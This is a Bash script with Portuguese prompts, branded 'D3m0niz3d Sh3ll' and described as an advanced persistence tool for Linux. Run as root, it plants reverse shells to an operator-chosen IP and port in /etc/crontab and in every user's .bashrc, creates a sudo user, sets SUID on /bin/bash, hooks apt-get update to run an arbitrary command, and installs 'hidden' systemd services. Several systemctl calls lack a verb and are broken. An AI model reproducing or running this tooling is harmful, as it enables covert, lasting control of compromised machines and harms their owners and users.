#!/bin/bash

rainbow() {
    local text=$1
    echo "$text" | lolcat -p 0.3 -a -d 1
}

if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
fi

sudo apt-get install lolcat -y

clear

rainbow "
                                 ,
                                /(        )\`
                                \\ \___   / |
                                /- _  \`-/  '
                               (/\\\/ \ \   /\\
                               / /   | \`    \\
                               O O   ) /    |
                               \`-^--'\`<     '
                   TM         (_.)  _  )   /
|  | |\  | ~|~ \ /             \`.___/ \`    /
|  | | \ |  |   X                \`-----' /
\`__| |  \| _|_ / \\  <----.     __ / __   \\
                    <----|====O)))==) \\) /====
                    <----'    \`--' \`.__,' \\
                                 |        |
                                  \\       /
                             ______( (_  / \______
                           ,'  ,-----'   |        \\
                           \`--{__________)        \\

D3m0niz3d Sh3ll is a Advanced Persistence Tool For Linux"

sleep 0.5
clear

while IFS=':' read -r username password uid gid full_name home shell; do
    if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]]; then
        rainbow "Usuário $username possui shell $shell"

        if [ ! -f "$home/.ssh/id_rsa.pub" ]; then
            rainbow "Gerando ssh-key para o usuário $username"

            sleep 5

            mkdir -p "$home/.ssh"

            ssh-keygen -t rsa -N "" -f "$home/.ssh/id_rsa"

            chmod 700 "$home/.ssh"
            chmod 600 "$home/.ssh/id_rsa"
            chown -R "$username:$username" "$home/.ssh"

            clear
        else
            rainbow "Chave SSH já existe para o usuário $username"
        fi
    fi
done < "/etc/passwd"

sleep 3

rainbow "SSH-KEY geradas para todos os usuários válidos com sucesso!! XDXD"

sleep 3
clear

rainbow " [*] Crontab Persistence [*] "
echo -e "\n"
rainbow "Deseja inserir um comando personalizado na crontab?"
rainbow "Digite 'sim' para inserir um comando personalizado ou 'nao' para executar o comando padrão."
read resposta

if [[ $resposta == "sim" ]]; then
  rainbow "Digite o comando que deseja adicionar à crontab:"
  read comando
else
  rainbow "Digite o endereço IP:"
  read ip

  rainbow "Digite a porta:"
  read porta

  comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
fi

rainbow "Adicionando o comando à crontab..."
echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null
rainbow "Comando adicionado com sucesso!"

sleep 3
clear

rainbow " [*] .bashrc Persistence [*] "
echo -e "\n"

  rainbow "Digite o endereço IP do seu listener:"
  read ip

  rainbow "Digite o número da porta do seu listener:"
  read porta

  payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"

  for usuario in /home/*; do
    if [ -d "$usuario" ]; then
      rainbow "Inserindo a payload de reverse shell no .bashrc de $usuario..."
      rainbow "$payload" >> "$usuario/.bashrc"
      rainbow "Payload inserida com sucesso em $usuario/.bashrc"
    fi
  done
rainbow ".bashrc persistence setupado com sucesso!!"

sleep 3
clear

rainbow " [*] Usuário Privilegiado & SUID /bin/bash [*] "
echo -e "\n"

rainbow "Digite um nome para o usuario: "
read user

adduser $user
usermod -aG sudo $user
chmod u+s /bin/bash

rainbow "Usuário $username criado com permissões de root e SUID setado no /bin/bash"

sleep 3
clear

rainbow " [ * ]  hookando o comando apt-get update [ * ] "
echo -e "\n"

rainbow "Digite um payload ou comando, assim que o usuario digitar sudo apt-get update, este comando que voce colocar a seguir, será executado!"
read command

sudo touch /etc/apt/apt.conf.d/1aptget
echo "APT::Update::Pre-Invoke {\"$command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null

rainbow "Seu hook está em /etc/apt/apt.conf.d/1aptget com o comando: $command"

sleep 3
clear

rainbow "[ * ] Systemd User level [ * ] "

echo -e "\n"

  rainbow "Deseja executar um script? (s/n): "
  read execute_script

if [[ $execute_script == "s" ]]; then
  rainbow "Digite o caminho completo do script: "
  read script_path
else
  rainbow "Digite o comando a ser executado no ExecStart: "
  read exec_command
fi

cat > ~/.config/systemd/user/hidden.service <<EOF
[Unit]
Description=Meu serviço de exemplo

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

if [[ $execute_script == "s" && ! -x $script_path ]]; then
  rainbow "Erro: O script especificado não tem permissão de execução."
else
  systemctl --user daemon-reload

  systemctl --user hidden.service
  systemctl --user hidden.service

  systemctl --user hidden.service
fi

rainbow "Systemd Persistence em user level setupado com sucesso!!"

sleep 3
clear

rainbow "[ * ] Systemd root level [ * ] "

echo -e "\n"

rainbow "Deseja executar um script? (s/n): "
read execute_script

if [[ $execute_script == "s" ]]; then
  rainbow "Digite o caminho completo do script: "
  read script_path
else
  rainbow "Digite o comando a ser executado no ExecStart: "
  read exec_command
fi

cat > /etc/systemd/system/hidden2.service <<EOF
[Unit]
Description=Meu serviço de exemplo

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

if [[ $execute_script == "s" && ! -x $script_path ]]; then
  rainbow "Error: O script especificado não tem permissão de execução."
else
  systemctl daemon-reload

  systemctl hidden2.service
  systemctl hidden2.service

  systemctl hidden2.service
fi
